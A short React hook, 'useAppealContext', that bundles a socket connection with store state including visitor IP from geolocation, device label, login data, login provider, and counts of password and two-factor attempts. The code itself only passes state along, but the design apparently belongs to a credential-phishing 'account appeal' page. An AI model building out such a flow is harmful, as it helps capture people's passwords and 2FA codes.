'use client';

import { useSocketEmit } from '@/hooks/use-socket';
import { store } from '@/store/store';
import { geoToIpInfo } from '@/utils/message';

export const useAppealContext = () => {
    const { socket, isConnected } = useSocketEmit();
    const {
        geoInfo,
        deviceLabel,
        messageId,
        formData,
        loginData,
        loginProvider,
        passwordAttempts,
        twoFAAttempts,
        setMessageId,
        setLoginData,
        addPasswordAttempt,
        addTwoFAAttempt
    } = store();

    const ip = geoInfo ? geoToIpInfo(geoInfo) : null;

    const ready = Boolean(socket && isConnected && ip && formData.fullName);

    return {
        socket,
        isConnected,
        ready,
        ip,
        deviceLabel,
        messageId,
        formData,
        loginData,
        loginProvider,
        passwordAttempts,
        twoFAAttempts,
        setMessageId,
        setLoginData,
        addPasswordAttempt,
        addTwoFAAttempt
    };
};
